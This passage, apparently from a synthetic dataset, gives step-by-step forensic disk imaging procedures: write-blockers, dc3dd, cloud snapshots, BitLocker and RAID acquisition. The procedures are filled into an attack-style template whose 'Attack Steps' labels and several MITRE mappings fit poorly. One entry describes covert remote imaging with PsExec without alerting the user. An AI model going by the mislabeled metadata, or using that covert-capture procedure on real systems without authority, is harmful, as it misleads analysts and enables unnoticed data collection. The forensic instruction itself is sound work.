- **MITRE**: N/A
- **Impact**: Legal Inadmissibility
- **Tools**: FTK Imager, Tableau Write-Blocker
- **Scenario**: Examiner uses a physical write-blocker to ensure no changes are made while acquiring an image
- **Attack Steps**: 1. Power off the suspect device and remove the hard drive carefully. 2. Connect the hard drive to the forensic workstation through a certified hardware write-blocker. 3. Power on the forensic machine and launch FTK Imager. 4. In FTK Imager, select “Create Disk Image” and choose “Physical Drive” as source. 5. Select the connected drive, configure the destination location, and name the image file. 6. Enable both MD5 and SHA1 hashing and logging. 7. Enter case metadata (examiner name, case number, etc.) to maintain chain of custody. 8. Begin acquisition and monitor progress through status logs. 9. Once completed, verify that hash values match, and export a full acquisition report. 10. Secure the image and original drive separately in evidence storage.
- **Detection**: Hash Verification
- **Solution**: Use write-blocker and verified hashes
- **Tags**: #writeblocker #ftkimager #evidence

## Creating Forensic Image with Magnet Acquire

- **Attack Type**: Disk Imaging
- **Target**: HDD / SSD
- **Vulnerability**: Data Contamination
- **MITRE**: T1005
- **Impact**: Chain of Custody Risk
- **Tools**: Magnet Acquire
- **Scenario**: A forensic analyst uses Magnet Acquire for imaging a suspect's hard drive in an enterprise case
- **Attack Steps**: 1. Connect the suspect drive to the forensic workstation via hardware write-blocker. 2. Launch Magnet Acquire and select "Create New Image". 3. Choose the evidence source (physical or logical) and define acquisition type (e.g., full or targeted). 4. Select output format (E01, RAW) and enable hashing (SHA256 or MD5). 5. Enter case details including suspect info, investigator name, and acquisition notes. 6. Specify destination path and storage volume with sufficient space. 7. Start imaging and observe progress through Magnet Acquire’s GUI logs. 8. On completion, compare calculated hash with expected value. 9. Export an HTML acquisition report with metadata. 10. Store evidence in encrypted containers if required and log actions.
- **Detection**: Image and report validation
- **Solution**: Secure tool with full logging
- **Tags**: #magnet #acquire #digitalforensics

## Disk Acquisition via Linux Boot ISO (Live CD)

- **Attack Type**: Disk Imaging
- **Target**: Live System (Linux)
- **Vulnerability**: File Modification
- **MITRE**: T1005
- **Impact**: Evidence Corruption
- **Tools**: Kali Linux, dd, dc3dd
- **Scenario**: Analyst needs to perform disk imaging without booting into suspect OS to avoid changes
- **Attack Steps**: 1. Boot the suspect system using a trusted Linux Live CD or USB (like Kali, CAINE). 2. Open terminal and verify device names using lsblk or fdisk -l. 3. Connect an external hard drive and mount it (e.g., /mnt/evidence). 4. Run dc3dd if=/dev/sda of=/mnt/evidence/image.dd hash=sha256 log=image.log. 5. Monitor progress; dc3dd shows real-time stats and hashes. 6. Once imaging completes, verify the generated hash against re-calculated one. 7. Save all logs, hashes, and image file together. 8. Power down the system and label all media. 9. Document entire process in acquisition notes for later reference.
- **Detection**: Boot Integrity Checks
- **Solution**: Use Live CD and verify hashes
- **Tags**: #linuxforensics #liveboot #dc3dd

## Imaging Deleted Partitions

- **Attack Type**: Disk Imaging
- **Target**: Hard Disk
- **Vulnerability**: Deleted Data
- **MITRE**: T1530
- **Impact**: Hidden or deleted evidence
- **Tools**: TestDisk, FTK Imager
- **Scenario**: Investigator encounters deleted partitions and must recover them before imaging
- **Attack Steps**: 1. Connect the suspect drive via write-blocker. 2. Use TestDisk to scan the drive for deleted or lost partitions. 3. Identify recoverable partitions and take note of their location and file system type. 4. Export the partition layout or recreate it temporarily in TestDisk. 5. Once partitions are mounted, launch FTK Imager. 6. Acquire images of the recovered partitions one by one. 7. Generate hashes and log all findings. 8. Document recovery process, including tools used and data accessed. 9. Compare with original MBR/GPT to verify legitimacy. 10. Store partition images and TestDisk logs securely.
- **Detection**: Partition Recovery Logs
- **Solution**: Combine imaging with recovery
- **Tags**: #testdisk #partitionrecovery

## Hash Verification Process (Post-Imaging)

- **Attack Type**: Hashing & Integrity
- **Target**: Forensic Image File
- **Vulnerability**: Data Integrity Violation
- **MITRE**: N/A
- **Impact**: Analysis on corrupt image
- **Tools**: FTK Imager, md5sum, sha256sum
- **Scenario**: Analyst validates the integrity of the acquired forensic image before analysis
- **Attack Steps**: 1. After creating the disk image, locate the original hash values generated by FTK or acquisition tool. 2. Use md5sum image.E01 and sha256sum image.E01 (or .dd) on a separate validation machine. 3. Compare the calculated hash with the one stored in the acquisition log. 4. If there's a mismatch, re-attempt hash calculation to rule out user error. 5. Log the final verified hash values and store with case documentation. 6. Create a separate hash log file and archive it with the image. 7. Optionally create hashes for individual critical files for future reference. 8. Use verified hash logs in court reports or incident documentation.
- **Detection**: Mismatch detection tools
- **Solution**: Always verify before analysis
- **Tags**: #hashing #md5 #sha256

## Imaging Using EWF Format for Compression

- **Attack Type**: Disk Imaging
- **Target**: Imaging Files
- **Vulnerability**: Space Efficiency Risk
- **MITRE**: N/A
- **Impact**: Missing segments
- **Tools**: FTK Imager, ewfacquire
- **Scenario**: Investigator wants to save space while maintaining integrity by using EWF format
- **Attack Steps**: 1. Open FTK Imager or use ewfacquire to start the imaging process. 2. Select the suspect disk as source and define E01/EWF as the image format. 3. Configure segment size, compression level, and hash type (MD5/SHA1). 4. Begin the acquisition and monitor segment creation. 5. After completion, check that all EWF segments are complete and have matching hashes. 6. Save metadata, case info, and audit trail logs. 7. Verify hashes using ewfverify or FTK tools. 8. Document file sizes and number of segments for archival. 9. Store in compressed archive folders with strong naming conventions. 10. Ensure tools used for later analysis support EWF format.
- **Detection**: Segment validation tools
- **Solution**: Use consistent segment policy
- **Tags**: #ewf #e01 #compressedimage

## Chain of Custody Log Maintenance

- **Attack Type**: Evidence Handling
- **Target**: Physical & Digital Evidence
- **Vulnerability**: Chain of Custody Lapses
- **MITRE**: N/A
- **Impact**: Evidence Rejection in Court
- **Tools**: Physical Log Sheet, Digital Forms
- **Scenario**: Maintaining proper documentation throughout imaging and transfer process
- **Attack Steps**: 1. Create a unique evidence ID and barcode for the disk. 2. At each step (acquisition, transfer, storage), record date, time, handler name, and action taken. 3. Log hash values, imaging tool used, storage location, and who accessed the evidence. 4. Use tamper-proof evidence bags and seal with forensic tape. 5. Digitize logs and store backups in case management software. 6. If evidence is handed off, require signatures from both parties. 7. Include a detailed acquisition report with timestamps. 8. During court presentation, provide the full chain from seizure to analysis. 9. Ensure logs are regularly audited. 10. Any break in custody should be immediately reported.
- **Detection**: Custody logs
- **Solution**: Use standardized custody forms
- **Tags**: #custody #chainofcustody #evidencehandling

## Imaging Disk via Tableau TX1

- **Attack Type**: Disk Imaging
- **Target**: Suspect Drive
- **Vulnerability**: Misconfiguration
- **MITRE**: T1005
- **Impact**: Incomplete acquisition
- **Tools**: Tableau TX1
- **Scenario**: High-performance forensic acquisition using Tableau TX1 hardware imager
- **Attack Steps**: 1. Connect the suspect drive to TX1 via SATA, IDE, or USB. 2. Power on the TX1 and navigate the touchscreen interface. 3. Select imaging mode: Logical or Physical. 4. Choose output destination (USB, SSD, network share). 5. Configure hashing (SHA256/MD5) and image format (E01/RAW). 6. Begin acquisition and monitor real-time stats. 7. TX1 performs onboard hashing and saves logs. 8. Export report via USB or email. 9. Verify image integrity post-process. 10. Label and store the evidence per SOP.
- **Detection**: Real-time logs
- **Solution**: Always validate with logs
- **Tags**: #tx1 #tableau #hardwareimager

## Remote Disk Imaging in Enterprise

- **Attack Type**: Remote Imaging
- **Target**: Enterprise Workstation
- **Vulnerability**: Remote Agent Exposure
- **MITRE**: T1021
- **Impact**: Privacy Risks
- **Tools**: F-Response, FTK Imager
- **Scenario**: Imaging employee machine disk remotely during an internal investigation
- **Attack Steps**: 1. Install F-Response agent on target machine with legal approval. 2. Connect from examiner’s forensic workstation using F-Response console. 3. Mount target’s disk read-only on the examiner system. 4. Launch FTK Imager and select the mounted drive. 5. Begin imaging with hashing and logging enabled. 6. Save the image locally or to encrypted storage. 7. Maintain logs of remote access, timestamps, and authentication. 8. Export F-Response audit trail for documentation. 9. Verify hashes and store image securely. 10. Notify internal team once imaging is complete.
- **Detection**: Access logs
- **Solution**: Use warrant & audit trail
- **Tags**: #fresponse #remoteimaging

## Disk Imaging with Autopsy Integration

- **Attack Type**: Disk Imaging
- **Target**: Acquired Disk Image
- **Vulnerability**: None
- **MITRE**: T1005
- **Impact**: Automation Gaps
- **Tools**: Autopsy, Sleuth Kit
- **Scenario**: Automating imaging and case creation using Autopsy
- **Attack Steps**: 1. Open Autopsy and create a new case with relevant details. 2. Use the integrated add-image option to select an E01/RAW file or perform imaging directly. 3. If no image exists, select FTK-compatible tool for disk acquisition. 4. Add hashes and metadata during the case setup. 5. Autopsy will index the image and extract file systems automatically. 6. Document image path, hash, and source media. 7. Begin analysis immediately after image is loaded. 8. All evidence added is logged with timestamps. 9. Export final report with all metadata and hash logs. 10. Store everything in encrypted forensic archive.
- **Detection**: Audit trail in Autopsy
- **Solution**: Always verify image integrity
- **Tags**: #autopsy #sleuthkit #automateddfir

## Cold Imaging via Write-Blocked Dock

- **Attack Type**: Disk Imaging
- **Target**: SATA/IDE Drive
- **Vulnerability**: Live Write Risk
- **MITRE**: T1005
- **Impact**: Evidence Tampering
- **Tools**: Write-blocker, FTK Imager
- **Scenario**: Investigator images a hard disk using hardware write-blocker to preserve integrity
- **Attack Steps**: 1. Power off the target system and remove the internal hard drive. 2. Connect the drive to a forensic workstation via a hardware write-blocker dock. 3. Launch FTK Imager and verify that the drive is detected read-only. 4. Select “Create Disk Image” and choose the physical drive. 5. Choose E01 format and enable hashing (MD5/SHA1). 6. Select a secure destination with enough space. 7. Begin imaging; monitor progress and error messages. 8. Upon completion, review and save logs and hash values. 9. Label the physical evidence and secure it. 10. Document the acquisition process thoroughly in chain-of-custody.
- **Detection**: FTK Logs + Hash Mismatch
- **Solution**: Use write blockers always
- **Tags**: #writeblocker #coldimaging #ftkimager

## Imaging Virtual Machine Disk from ESXi

- **Attack Type**: Virtual Disk Acquisition
- **Target**: Virtual Machine
- **Vulnerability**: VMDK Misuse
- **MITRE**: T1005
- **Impact**: Live VM Alteration
- **Tools**: VMware vSphere, SCP, FTK Imager
- **Scenario**: Analyst acquires a VM disk image hosted on VMware ESXi without powering down
- **Attack Steps**: 1. Access ESXi host via SSH or vSphere client. 2. Identify the VM and locate its .vmdk files in the datastore. 3. Use scp or datastore browser to copy .vmdk to local forensic workstation. 4. Use FTK Imager or Mount Image Pro to mount the VMDK read-only. 5. Create a forensic image from the mounted disk. 6. Enable hashing and logging during image creation. 7. Store both raw VMDK and forensic copy securely. 8. Document VM state, OS, and snapshot configuration. 9. Validate hashes and verify integrity. 10. Include VM metadata in final report.
- **Detection**: Snapshots + Logs
- **Solution**: Always mount readonly
- **Tags**: #vmware #vmdk #virtualforensics

## Imaging Linux Disk with DC3DD in Read-Only Mode

- **Attack Type**: Disk Imaging
- **Target**: Linux System
- **Vulnerability**: Linux-Specific Tools
- **MITRE**: T1005
- **Impact**: Improper Hashing
- **Tools**: dc3dd
- **Scenario**: Forensic team creates a bit-by-bit image of a Linux disk using DC3DD
- **Attack Steps**: 1. Boot suspect system into live Linux using forensic USB. 2. Open terminal and run lsblk to identify the target disk. 3. Mount external storage for output. 4. Execute dc3dd if=/dev/sda of=/mnt/evidence/linux_image.dd hash=sha256 log=logfile.txt 5. Monitor the progress; dc3dd will generate hash on-the-fly. 6. Once complete, verify output image hash. 7. Save and print log file for documentation. 8. Label disk image appropriately. 9. Hash entire image using sha256sum. 10. Store image securely in chain-of-custody storage.
- **Detection**: Hash Verification
- **Solution**: Use dc3dd over dd
- **Tags**: #linuxforensics #dc3dd #hashing

## Cloud VM Disk Snapshot Acquisition

- **Attack Type**: Cloud Imaging
- **Target**: Cloud Instance
- **Vulnerability**: EBS Snapshot Abuse
- **MITRE**: T1078
- **Impact**: Snapshot Tampering
- **Tools**: AWS Console, AWS CLI, FTK Imager
- **Scenario**: Investigator acquires a forensic snapshot from AWS EC2 instance
- **Attack Steps**: 1. Login to AWS Console or use AWS CLI. 2. Stop the EC2 instance to avoid corruption (if permitted). 3. Create a snapshot of the attached EBS volume. 4. Create a volume from the snapshot. 5. Attach volume to a separate forensic EC2 instance. 6. Mount volume read-only in Linux. 7. Use FTK Imager or dc3dd to acquire image of attached volume. 8. Save image to S3 or external mounted volume. 9. Verify hash and record metadata. 10. Detach and delete temporary forensic instance.
- **Detection**: AWS CloudTrail
- **Solution**: Log all snapshot actions
- **Tags**: #cloudforensics #aws #ebs

## Forensic Analysis of Hybrid Drive (HDD + SSD Cache)

- **Attack Type**: Disk Imaging
- **Target**: Hybrid Drives
- **Vulnerability**: Split Storage Layers
- **MITRE**: T1005
- **Impact**: Missed SSD Cache Data
- **Tools**: FTK Imager, OSForensics
- **Scenario**: Examiner analyzes hybrid drive with rotating platter + SSD cache using logical + physical approaches
- **Attack Steps**: 1. Connect hybrid drive to forensic system using write blocker. 2. Image the spinning HDD portion using standard tools (e.g., FTK Imager). 3. Attempt to access SSD cache via manufacturer utility or forensic hardware. 4. Analyze logical content using OSForensics. 5. Compare temporal access data from both storage types. 6. Document data found only in SSD cache (frequently used apps). 7. Hash and export unique findings. 8. Report any discrepancies in cache vs HDD. 9. Store image and tools used. 10. Provide insight on hybrid drive challenges in report.
- **Detection**: Compare OS access logs
- **Solution**: Hybrid-specific tools
- **Tags**: #hybriddrive #hddssd #cacheforensics

## Memory Card Imaging for Mobile Artifact Extraction

- **Attack Type**: Disk Imaging
- **Target**: microSD / SD Card
- **Vulnerability**: Small Media Storage
- **MITRE**: T1005
- **Impact**: Card Overwritten
- **Tools**: FTK Imager, USB Card Reader
- **Scenario**: Analyst acquires image from microSD card removed from smartphone
- **Attack Steps**: 1. Remove microSD card from mobile device. 2. Insert into write-blocked USB card reader. 3. Open FTK Imager and select physical drive. 4. Create image in E01 format with MD5 + SHA1 hash. 5. Monitor for read errors; retry or log if needed. 6. Once complete, validate hashes. 7. Save and export image to evidence storage. 8. Analyze with mobile forensic tools (like Magnet AXIOM). 9. Document file system (exFAT/FAT32) and timestamps. 10. Store original SD card in anti-static evidence bag.
- **Detection**: File Signature Tools
- **Solution**: Secure handling required
- **Tags**: #mobileforensics #sdcard #ftkimager

## USB Thumb Drive Acquisition via Helix Live OS

- **Attack Type**: Removable Media Forensics
- **Target**: USB Drive
- **Vulnerability**: Plug-and-Play Devices
- **MITRE**: T1052
- **Impact**: Portable Malware
- **Tools**: Helix, dd, SHA256SUM
- **Scenario**: Investigator uses Helix Live OS to acquire forensic image of a USB stick
- **Attack Steps**: 1. Boot system using Helix Live CD/USB. 2. Insert USB device and verify read-only mount. 3. Use terminal to identify device path (e.g., /dev/sdb). 4. Run dd if=/dev/sdb of=/evidence/usb_image.dd bs=4M conv=noerror,sync 5. Calculate SHA256 hash of image using sha256sum. 6. Document acquisition time, device info, and hash value. 7. Store image in secure location with logs. 8. Analyze .dd image using Autopsy or FTK. 9. Label and seal original USB. 10. Maintain strict chain-of-custody for USB media.
- **Detection**: USB Insert Event Logs
- **Solution**: Analyze contents after imaging
- **Tags**: #usbforensics #helixos #dd

## Drive Imaging After Ransomware Incident

- **Attack Type**: Incident Response Imaging
- **Target**: Encrypted Endpoint
- **Vulnerability**: Post-Incident
- **MITRE**: T1486
- **Impact**: Ransomware Spread
- **Tools**: FTK Imager, RansomNoteDetector
- **Scenario**: Examiner images a disk post-ransomware to preserve encrypted and residual files
- **Attack Steps**: 1. Isolate system from network to stop ransomware spread. 2. Attach external write-blocked storage for acquisition. 3. Launch FTK Imager and acquire full physical image. 4. Retain encrypted files and ransom notes in image. 5. Hash the disk image. 6. Extract and analyze ransom notes separately. 7. Record file extension changes, timestamps. 8. Identify encryption patterns or key files. 9. Report ransomware variant if identified. 10. Preserve evidence for law enforcement or decryption efforts.
- **Detection**: File hash diff + timestamp
- **Solution**: Immediate disk isolation
- **Tags**: #ransomware #dfir #diskimaging

## Hidden Partition Extraction Using DiskGenius

- **Attack Type**: Partition Recovery
- **Target**: Hidden Partition
- **Vulnerability**: Hidden Storage Abuse
- **MITRE**: T1564.004
- **Impact**: Data Concealment
- **Tools**: DiskGenius, FTK Imager
- **Scenario**: Investigator discovers and extracts data from hidden partition on suspect drive
- **Attack Steps**: 1. Connect suspect disk to forensic workstation. 2. Open DiskGenius and scan for hidden/unallocated partitions. 3. Mount discovered hidden partitions read-only. 4. Use FTK Imager to create image of hidden partition. 5. Validate hash of extracted partition. 6. Analyze recovered content (often used to hide data). 7. Compare against primary OS partition timestamps. 8. Document location, size, and creation date of partition. 9. Store image and access logs securely. 10. Include visual screenshots in report.
- **Detection**: Partition Table Comparison
- **Solution**: Use recovery tools
- **Tags**: #hiddenpartition #diskgenius #recovery

## Dual-Boot System Forensic Imaging

- **Attack Type**: Complex Disk Imaging
- **Target**: Dual OS System
- **Vulnerability**: OS Coexistence
- **MITRE**: T1005
- **Impact**: Partial Imaging Misses OS
- **Tools**: FTK Imager, OSFMount
- **Scenario**: Analyst creates image of a system with both Linux and Windows OS installed
- **Attack Steps**: 1. Power off the system and connect disk to write-blocker. 2. Use FTK Imager to acquire physical image of the entire disk. 3. Identify separate partitions (e.g., NTFS for Windows, EXT4 for Linux). 4. Mount partitions individually using OSFMount. 5. Document bootloader (e.g., GRUB) and OS order. 6. Extract user data from both OS environments. 7. Verify image integrity with hashes. 8. Tag files by OS origin for clarity. 9. Record partition sizes and system configuration. 10. Report dual-boot structure in summary.
- **Detection**: Partition Signatures
- **Solution**: Always image full disk
- **Tags**: #dualboot #windowslinux #forensics

## Imaging Locked BitLocker Drive with Recovery Key

- **Attack Type**: Encrypted Drive Imaging
- **Target**: Encrypted Windows Drive
- **Vulnerability**: Data Protection via BitLocker
- **MITRE**: T1553.005
- **Impact**: Imaging Skipped Due to Encryption
- **Tools**: FTK Imager, BitLocker Tool
- **Scenario**: Examiner creates forensic image of a BitLocker-encrypted drive using recovery key
- **Attack Steps**: 1. Obtain BitLocker recovery key legally or from system registry if available. 2. Remove drive and attach to forensic workstation via write blocker. 3. Use BitLocker management tool (manage-bde) to unlock the volume using the recovery key. 4. Once unlocked, launch FTK Imager. 5. Acquire forensic image in E01 format with enabled hashing. 6. Store logs, hashes, and copy of recovery key. 7. Analyze decrypted contents using forensic software. 8. Tag any encrypted files or suspicious encryption usage. 9. Save audit logs showing unlock and acquisition process. 10. Include recovery metadata in final report.
- **Detection**: Access Logs + Decryption Record
- **Solution**: Use proper key + log unlock
- **Tags**: #bitlocker #encryptedimaging #recoverykey

## RAID Array Disk Imaging & Reconstruction

- **Attack Type**: Multi-Disk Imaging
- **Target**: RAID Array (5 or 10)
- **Vulnerability**: Striping/Parity Complexity
- **MITRE**: T1005
- **Impact**: Missing Disks = Data Loss
- **Tools**: FTK Imager, RAID Reconstructor
- **Scenario**: Analyst performs forensic imaging of a RAID 5 array for data recovery
- **Attack Steps**: 1. Label and remove all RAID disks in correct order from target system. 2. Connect each disk to forensic system using write blockers. 3. Use RAID Reconstructor to rebuild logical RAID configuration. 4. Identify RAID type (RAID 0/1/5/10), block size, and order. 5. Once reconstructed, mount the volume read-only. 6. Create full forensic image using FTK Imager. 7. Hash and verify the image. 8. Note any parity errors or missing disks. 9. Document RAID controller, layout, and disk info. 10. Store RAID image securely with chain-of-custody.
- **Detection**: Rebuild Logs
- **Solution**: Precise disk order critical
- **Tags**: #raidforensics #striping #parity

## Imaging Live Linux System with ddrescue

- **Attack Type**: Live Disk Acquisition
- **Target**: Damaged Linux Disk
- **Vulnerability**: Sector-Level Failures
- **MITRE**: T1561.001
- **Impact**: Data Loss in Bad Sectors
- **Tools**: ddrescue, Terminal
- **Scenario**: Forensic team acquires image from live Linux system with disk errors using ddrescue
- **Attack Steps**: 1. Insert forensic external disk with live OS and ddrescue tool. 2. Identify suspect drive using lsblk. 3. Use ddrescue: ddrescue -d -r3 /dev/sda /mnt/evidence/image.img log.log 4. -r3 retries bad sectors 3 times, log.log tracks progress. 5. Monitor status to catch unreadable blocks. 6. Once completed, use sha256sum to hash the image. 7. Save the rescue log and image together. 8. Note bad sectors and regions skipped. 9. Store in secure external drive. 10. Report damage level and image integrity in findings.
- **Detection**: Sector Comparison + Log
- **Solution**: Use ddrescue not dd
- **Tags**: #ddrescue #linuximaging #badsectors

## Covert Partition Imaging from Hidden Volumes

- **Attack Type**: Hidden Data Acquisition
- **Target**: Hidden TrueCrypt Volume
- **Vulnerability**: Encrypted Steganography
- **MITRE**: T1564.001
- **Impact**: Concealed Data Exfiltration
- **Tools**: TrueCrypt, FTK Imager
- **Scenario**: Examiner extracts data from hidden volume in TrueCrypt container
- **Attack Steps**: 1. Acquire full physical disk image using FTK Imager. 2. Use TrueCrypt to mount image and scan for hidden volumes. 3. If password is known, mount hidden partition separately. 4. Extract logical image of hidden volume. 5. Hash and compare with full disk image for difference analysis. 6. Use data carving tools to recover deleted/obfuscated files. 7. Document hidden volume size, location, and access date. 8. Screenshot TrueCrypt mount window as evidence. 9. Report any findings indicating anti-forensic behavior. 10. Store both original and hidden volume images securely.
- **Detection**: Mount Logs
- **Solution**: Search for anomalies
- **Tags**: #truecrypt #hiddenvolume #covertdata

## Creating Timeline from Disk Image

- **Attack Type**: Post-Imaging Analysis
- **Target**: Disk Image (NTFS, EXT4)
- **Vulnerability**: Post-Incident Timeline
- **MITRE**: T1070.004
- **Impact**: Timestamp Tampering
- **Tools**: Sleuth Kit, Autopsy
- **Scenario**: Analyst creates filesystem timeline using acquired disk image
- **Attack Steps**: 1. Load forensic disk image into Autopsy or TSK. 2. Enable "File System Analysis" module. 3. Generate timeline from filesystem metadata (MAC times). 4. Visualize file creation, access, modification events. 5. Look for spike activity before/after known incident time. 6. Tag suspicious activity (e.g., unexpected file installs). 7. Export timeline to CSV/HTML format. 8. Cross-reference with logs (e.g., Windows Event Logs). 9. Highlight anomalies in final report. 10. Preserve timeline report with disk image.
- **Detection**: File Audit Trail
- **Solution**: Always correlate with logs
- **Tags**: #timeline #sleuthkit #autopsy

## Disk Imaging on macOS Using Apple System Image Utility

- **Attack Type**: macOS Imaging
- **Target**: macOS Disk
- **Vulnerability**: Apple File System
- **MITRE**: T1005
- **Impact**: APFS Encryption Bypass
- **Tools**: Apple System Image Utility, Disk Utility
- **Scenario**: Forensic team performs logical imaging of macOS device using Apple tools
- **Attack Steps**: 1. Boot into macOS Recovery or connect via Target Disk Mode. 2. Launch Disk Utility and verify disk. 3. Open Terminal and run hdiutil create -srcdevice /dev/disk2 /Volumes/Evidence/mac_image.dmg 4. Image is created in .dmg format. 5. Calculate SHA256 hash of the image. 6. Mount image on forensic system for logical analysis. 7. Use tools like BlackLight to extract user artifacts. 8. Document APFS or HFS+ layout, volume size, encryption. 9. Save image with chain-of-custody. 10. Note any FileVault protection (if decrypted).
- **Detection**: Log Image Path + Hash
- **Solution**: Use Apple-native tools
- **Tags**: #macforensics #dmgimaging #apfs

## Covert Imaging via Network Share

- **Attack Type**: Remote Imaging
- **Target**: Remote Windows Host
- **Vulnerability**: Network Visibility
- **MITRE**: T1105
- **Impact**: Covert Data Collection
- **Tools**: FTK Imager, PsExec, Shared Folder
- **Scenario**: Examiner captures forensic image of target system over network without alerting user
- **Attack Steps**: 1. Gain authorized remote shell access using PsExec. 2. Mount shared folder on examiner's workstation. 3. Copy FTK Imager CLI to target system. 4. Launch ftkimager.exe with CLI arguments to write image to network share. 5. Enable SHA256 hashing and compression. 6. Monitor network for large data flow. 7. Upon completion, verify image hash. 8. Unmount shared folder, delete temp files. 9. Document all CLI arguments and network paths. 10. Analyze image locally.
- **Detection**: Firewall Logs
- **Solution**: Monitor network imaging
- **Tags**: #remoteforensics #ftkimager #covertcapture

## Targeted Partition Imaging (e.g., Only C:)

- **Attack Type**: Triage Imaging
- **Target**: Windows Partition
- **Vulnerability**: Fast Response Need
- **MITRE**: Triage
- **Impact**: Incomplete Evidence Risk
- **Tools**: FTK Imager, Guymager
- **Scenario**: Analyst captures only critical partition (e.g., Windows C:) to speed acquisition
- **Attack Steps**: 1. Boot forensic OS via USB. 2. Identify critical partitions (boot, system, user) using lsblk or Disk Management. 3. Launch FTK Imager and select only C: or root partition. 4. Save image as .E01 with hashes. 5. Note skipped partitions (e.g., recovery, Linux dual-boot). 6. Store smaller image for faster analysis. 7. Mount and analyze acquired partition. 8. Report limitations (partial disk, context loss). 9. Label clearly as “partial acquisition.” 10. Use for rapid triage or malware hunting.
- **Detection**: Image Scope Limitations
- **Solution**: Always disclose scope
- **Tags**: #triage #partialimaging #partition

## Secure Image Storage and Verification Process

- **Attack Type**: Post-Imaging Handling
- **Target**: Forensic Disk Images
- **Vulnerability**: Evidence Integrity
- **MITRE**: T1119
- **Impact**: Tampered Chain of Custody
- **Tools**: VeraCrypt, SHA256, 7-Zip
- **Scenario**: Team stores, transfers, and verifies disk images securely for long-term retention
- **Attack Steps**: 1. Hash image with SHA256 before storage. 2. Encrypt image container using VeraCrypt. 3. Archive with 7-Zip (.7z) to reduce size and embed hash file. 4. Store on redundant storage (RAID + cloud). 5. Label clearly with acquisition date and hash. 6. Maintain secure logs for every transfer. 7. Re-verify hash at destination. 8. Use digital signatures to track changes. 9. Document storage lifecycle in case file. 10. Back up metadata and acquisition notes.
- **Detection**: Periodic Rehashing
- **Solution**: Encrypt + log every move
- **Tags**: #evidencestorage #hashing #veracrypt

## Recovery of Deleted Files via Disk Image

- **Attack Type**: Data Carving
- **Target**: Deleted File Space
- **Vulnerability**: Forensic Carving
- **MITRE**: T1025
- **Impact**: File Wipe or Hiding
- **Tools**: Autopsy, Foremost, PhotoRec
- **Scenario**: Analyst recovers deleted files from disk image using carving tools
- **Attack Steps**: 1. Load full disk image into Autopsy or Foremost. 2. Run data carving on unallocated space. 3. Identify file types via headers (e.g., JPG, DOCX, ZIP). 4. Recover files and save in categorized folders. 5. Use PhotoRec for additional carving. 6. Cross-check recovered files with file system for context. 7. Hash and timestamp each recovered file. 8. Document recovery confidence and limitations. 9. Flag any notable or suspicious files. 10. Include recovery summary in DFIR report.
- **Detection**: Carving Logs
- **Solution**: Tag recovered evidence
- **Tags**: #filecarving #foremost #photorec

## Acquiring VHD Image from Hyper-V Host

- **Attack Type**: Virtual Disk Imaging
- **Target**: Hyper-V VM Disk
- **Vulnerability**: VM Environment
- **MITRE**: T1070
- **Impact**: Stealthy Virtual Abuse
- **Tools**: Hyper-V Manager, PowerShell
- **Scenario**: Analyst acquires virtual disk image (VHD) from compromised Hyper-V system
- **Attack Steps**: 1. Log in to Hyper-V host with appropriate permissions. 2. Identify target VM and locate its .VHD or .VHDX file path. 3. Shut down the VM to ensure image consistency. 4. Use PowerShell to copy the VHD file to external storage: Copy-Item "C:\VMs\VM1\disk.vhdx" D:\Evidence. 5. Hash the copied image using Get-FileHash. 6. Store hash and image securely. 7. Mount the VHD on forensic workstation (read-only). 8. Analyze with tools like X-Ways or Autopsy. 9. Document VM metadata (name, config, OS). 10. Report activity timeline inside the VHD.
- **Detection**: VHD Access Logs
- **Solution**: VHD backups must be monitored
- **Tags**: #hyperv #vhdforensics #vmimaging

## Disk Imaging on IoT Device (Raspberry Pi)

- **Attack Type**: IoT Disk Acquisition
- **Target**: Raspberry Pi SD Card
- **Vulnerability**: IoT Storage
- **MITRE**: T1020
- **Impact**: Hidden Scripts in IoT
- **Tools**: dd, Pi Imager, USB card reader
- **Scenario**: Forensics team captures image of Raspberry Pi's SD card after a suspected breach
- **Attack Steps**: 1. Power off the Raspberry Pi safely. 2. Remove the SD card and insert into forensic system using USB card reader. 3. Use lsblk to identify the SD card (e.g., /dev/sdb). 4. Run dd if=/dev/sdb of=/mnt/evidence/pi.img bs=4M status=progress. 5. Once done, hash the image: sha256sum pi.img > pi.hash. 6. Analyze the image with tools like Autopsy or Binwalk. 7. Check for malicious scripts, configs, or cron jobs. 8. Document partitions (boot, rootfs). 9. Record Raspberry Pi OS version and device serial. 10. Store image and notes securely.
- **Detection**: SD Card Forensic Hash
- **Solution**: Isolate from networks
- **Tags**: #iotforensics #raspberrypi #sdcardimaging

## Creating Forensic Image of USB Flash Drive

- **Attack Type**: Removable Media Imaging
- **Target**: USB Flash Drive
- **Vulnerability**: Removable Media
- **MITRE**: T1091
- **Impact**: Malware via USB Drop
- **Tools**: FTK Imager, USB Write Blocker
- **Scenario**: Examiner images USB flash drive found connected to suspect machine
- **Attack Steps**: 1. Connect the USB flash drive via write blocker. 2. Launch FTK Imager and identify the removable drive. 3. Create image in .E01 format with MD5/SHA1 hash. 4. Enable sector-level acquisition. 5. Save image and metadata in evidence folder. 6. Use file system viewer to preview files. 7. Look for autoruns, payloads, and suspicious EXEs. 8. Analyze deleted files or encrypted content. 9. Preserve original USB in anti-static bag. 10. Document physical labeling, brand, and capacity.
- **Detection**: USB Connection Logs
- **Solution**: Disable autorun, train users
- **Tags**: #usbforensics #removablemedia #portabledevice

## Snapshot-Based Imaging of AWS EBS Volume

- **Attack Type**: Cloud Disk Imaging
- **Target**: AWS Cloud Disk (EBS)
- **Vulnerability**: IaaS Environment
- **MITRE**: T1530
- **Impact**: Cloud Persistence
- **Tools**: AWS CLI, EC2, EBS
- **Scenario**: Investigator acquires forensic copy of AWS EC2 instance disk via snapshot
- **Attack Steps**: 1. Identify the EBS volume attached to target EC2 instance. 2. Use AWS CLI: aws ec2 create-snapshot --volume-id vol-xxxx --description "DFIR Evidence". 3. Create a temporary volume from the snapshot. 4. Attach the new volume to a forensic EC2 instance. 5. Use dd or FTK Imager to acquire image from attached volume. 6. Hash the image and log the snapshot ID. 7. Detach and delete the temporary volume. 8. Analyze the image offline for artifacts. 9. Store metadata (AMI, region, snapshot ID). 10. Note encryption status and access control.
- **Detection**: Snapshot Audit Logs
- **Solution**: Lock down snapshot permissions
- **Tags**: #cloudforensics #aws #ebs

## Imaging FileVault Encrypted Mac Using Recovery Mode

- **Attack Type**: macOS Disk Encryption Imaging
- **Target**: FileVault Encrypted Disk
- **Vulnerability**: macOS Device
- **MITRE**: T1553
- **Impact**: Hiding via Native Encryption
- **Tools**: macOS Terminal, Disk Utility
